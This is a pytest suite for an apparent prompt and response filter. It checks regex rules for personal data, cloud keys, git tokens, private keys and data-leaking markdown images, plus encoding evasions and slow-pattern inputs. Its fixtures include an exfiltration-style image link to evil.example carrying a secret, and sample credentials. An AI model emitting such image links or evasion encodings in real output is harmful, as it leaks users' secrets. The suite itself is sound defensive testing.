import base64
import time
from urllib.parse import quote

import pytest

from intentlatch.normalize import normalized_views
from intentlatch.pipeline import pattern_matches
from intentlatch.policies import load_seeds

SEEDS = {seed.code: seed for seed in load_seeds()}

REGEX_SEEDS = {
    "RGX-EMAIL": ("edit", "both"),
    "RGX-PHONE": ("edit", "both"),
    "RGX-IBAN": ("edit", "both"),
    "RGX-PESEL": ("edit", "both"),
    "RGX-CARD": ("edit", "both"),
    "RGX-CLOUD-KEY": ("block", "both"),
    "RGX-GIT-TOKEN": ("block", "both"),
    "RGX-PRIVATE-KEY": ("block", "both"),
    "RGX-EXFIL-IMAGE": ("block", "response"),
}

AI_SEEDS = {
    "AI-NO-CREDENTIALS": ("block", "both"),
    "AI-NO-JAILBREAK": ("block", "prompt"),
    "AI-NO-COMMITMENTS": ("edit", "response"),
}

TOKEN_BODY = "a1B2" * 9

MATCHES = {
    "RGX-EMAIL": ["jan.kowalski@firma.pl", "a.b+tag@mail.example.co.uk"],
    "RGX-PHONE": ["+48 600 700 800", "+48600700800", "+1 (415) 555-2671", "600 700 800", "600-700-800"],
    "RGX-IBAN": [
        "PL61 1090 1014 0000 0712 1981 2874",
        "PL61109010140000071219812874",
        "DE89 3704 0044 0532 0130 00",
        "NO93 8601 1117 947",
        "DE89" + "AB12" * 7 + "CD",
    ],
    "RGX-PESEL": ["44051401458"],
    "RGX-CARD": ["4111 1111 1111 1111", "4111-1111-1111-1111", "5555555555554444", "378282246310005"],
    "RGX-CLOUD-KEY": ["AKIAIOSFODNN7EXAMPLE", "AIzaSyA1234567890abcdefghijklmnopqrstuv"],
    "RGX-GIT-TOKEN": ["ghp_" + TOKEN_BODY, "glpat-" + TOKEN_BODY[:20]],
    "RGX-PRIVATE-KEY": [
        "-----BEGIN RSA PRIVATE KEY-----",
        "-----BEGIN OPENSSH PRIVATE KEY-----",
        "-----BEGIN PRIVATE KEY-----",
        "-----BEGIN PGP PRIVATE KEY BLOCK-----",
    ],
    "RGX-EXFIL-IMAGE": ["![x](https://evil.example/c?d=secret)", "![](http://a.example/p.png?q=1)"],
}

NON_MATCHES = {
    "RGX-EMAIL": ["@firma.pl", "user@localhost", "jan at firma dot pl"],
    "RGX-PHONE": ["2026-10-04", "600700800", "100 000", "+1"],
    "RGX-IBAN": [
        "PL61 1090",
        "pl61 1090 1014 0000 0712 1981 2874",
        "DE89 3704 0044 05",
        "DE89" + "AB12" * 7 + "CDE",
    ],
    "RGX-PESEL": ["44151401458", "4405140145", "440514014581"],
    "RGX-CARD": ["4111 1111 1111 1112", "1696406400000"],
    "RGX-CLOUD-KEY": ["AKIA1234", "akiaiosfodnn7example"],
    "RGX-GIT-TOKEN": ["ghp_short", "gh_" + TOKEN_BODY],
    "RGX-PRIVATE-KEY": ["-----BEGIN PUBLIC KEY-----", "-----BEGIN CERTIFICATE-----"],
    "RGX-EXFIL-IMAGE": ["![logo](https://example.com/logo.png)", "[x](https://evil.example/c?d=1)"],
}

EVASIONS = [
    ("RGX-CLOUD-KEY", "AKIA​IOSFODNN7EXAMPLE"),
    ("RGX-EMAIL", "jan.kowalski@‍firma.pl"),
    ("RGX-EMAIL", quote("jan.kowalski@firma.pl")),
    ("RGX-EMAIL", base64.b64encode(b"jan.kowalski@firma.pl").decode()),
    ("RGX-CLOUD-KEY", quote(base64.b64encode(b"AKIAIOSFODNN7EXAMPLE").decode(), safe="")),
]

BENIGN = [
    "What is the capital of Poland?",
    "Summarize the Q3 report in three bullet points, please.",
    "Meeting moved to 2026-10-04 at 10:30, room 4.12.",
    "Version 1.2.3 fixed bug #4521 in the parser.",
    "The invoice total is 1 250,00 PLN, due in 14 days.",
    "See the docs at https://example.com/guide?page=2 for details.",
]

# Repeated prefix fragments start many partial matches, which is what exposes a slow pattern.
HOSTILE_FRAGMENTS = [
    "a", "a.", "a@", "a@b.", "4", "4 ", "+1 ", "600 ", "PL61 ", "4111 ", "AKIA", "AIza", "ghp_",
    "-----BEGIN ", "![", "![x](http://a", "%41", "A",
]
HOSTILE_SIZE = 100_000


def matches(code: str, text: str) -> bool:
    return pattern_matches(SEEDS[code].params["pattern"], normalized_views(text))


def hostile(fragment: str) -> str:
    return (fragment * (HOSTILE_SIZE // len(fragment) + 1))[:HOSTILE_SIZE]


def test_regex_seeds_have_their_action_and_direction():
    regex = {code: (seed.action, seed.applies_to) for code, seed in SEEDS.items() if seed.kind == "regex"}
    assert regex == REGEX_SEEDS
    assert all(SEEDS[code].enabled and not SEEDS[code].ai for code in REGEX_SEEDS)


def test_ai_seeds_have_their_action_and_direction():
    seeded = {code: (seed.action, seed.applies_to) for code, seed in SEEDS.items() if seed.ai}
    assert seeded == AI_SEEDS
    assert all(SEEDS[code].enabled and SEEDS[code].text for code in AI_SEEDS)


@pytest.mark.parametrize(("code", "text"), [(code, text) for code, texts in MATCHES.items() for text in texts])
def test_seed_matches(code, text):
    assert matches(code, f"Here it is: {text} thanks")


@pytest.mark.parametrize(
    ("code", "text"), [(code, text) for code, texts in NON_MATCHES.items() for text in texts]
)
def test_seed_does_not_match(code, text):
    assert not matches(code, f"Here it is: {text} thanks")


@pytest.mark.parametrize(("code", "text"), EVASIONS)
def test_encoding_tricks_still_match(code, text):
    assert matches(code, f"Here it is: {text} thanks")


@pytest.mark.parametrize("text", BENIGN)
def test_benign_text_passes_every_seed(text):
    assert [code for code in REGEX_SEEDS if matches(code, text)] == []


@pytest.mark.parametrize("code", sorted(REGEX_SEEDS))
def test_seed_stays_fast_on_hostile_input(code):
    started = time.perf_counter()
    for fragment in HOSTILE_FRAGMENTS:
        matches(code, hostile(fragment))
    assert time.perf_counter() - started < 1.0
